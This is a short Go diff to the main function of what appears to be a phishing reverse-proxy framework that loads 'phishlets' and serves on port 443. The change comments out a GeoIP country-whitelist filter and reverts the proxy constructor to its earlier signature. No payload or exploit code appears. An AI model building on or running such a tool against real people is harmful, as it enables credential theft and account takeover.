@@ -114,10 +114,10 @@ func main() {
 		return
 	}
 	
-	wl, err, geoip_db := core.NewWhitelist(filepath.Join(*cfg_dir, "country_whitelist.txt"), filepath.Join(*cfg_dir, "GeoIP2-City.mmdb"))
-	if err != nil {
-		log.Info("Country Whitelist: %s", err)
-	}
+// 	wl, err, geoip_db := core.NewWhitelist(filepath.Join(*cfg_dir, "country_whitelist.txt"), filepath.Join(*cfg_dir, "GeoIP2-City.mmdb"))
+// 	if err != nil {
+// 		log.Info("Country Whitelist: %s", err)
+// 	}
 
 	files, err := ioutil.ReadDir(phishlets_path)
 	if err != nil {
@@ -157,8 +157,8 @@ func main() {
 
 	log.Debug("config: %v", cfg)
 
-	//hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode)
-	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, wl, geoip_db, *developer_mode)
+	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode)
+	//hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, wl, geoip_db, *developer_mode)
 	hp.Start()
 
  	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
@@ -169,5 +169,5 @@ func main() {
 	}
 
 	t.DoWork()
-	defer geoip_db.Close()
+	//defer geoip_db.Close()
 }
